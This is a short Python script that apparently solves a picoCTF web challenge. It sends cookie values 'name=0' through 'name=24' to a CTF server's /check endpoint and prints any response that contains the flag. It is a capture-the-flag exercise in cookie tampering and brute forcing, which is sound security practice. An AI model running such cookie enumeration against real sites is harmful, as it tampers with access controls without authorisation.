import requests
for i in range(25):
    cookie = f'name={i};'
    headers = {'Cookie':cookie}
    print(headers)
    r = requests.get('http://mercury.picoctf.net:17781/check', headers=headers)
    if (r.status_code == 200) and ('picoCTF' in r.text):
        print(r.text)